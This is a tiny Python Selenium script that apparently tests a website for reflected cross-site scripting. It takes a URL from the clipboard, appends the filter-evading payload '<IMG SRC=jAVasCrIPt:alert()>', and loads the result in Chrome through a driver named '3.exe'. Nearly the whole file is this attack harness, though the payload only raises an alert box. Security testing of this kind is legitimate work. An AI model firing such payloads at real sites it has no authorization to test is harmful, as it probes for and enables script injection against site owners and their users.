from selenium import webdriver
import os
import pyperclip as pc
driver = webdriver.Chrome(executable_path="3.exe")
driver.maximize_window()
driver.get("{}<IMG SRC=jAVasCrIPt:alert()>".format(pc.paste()))
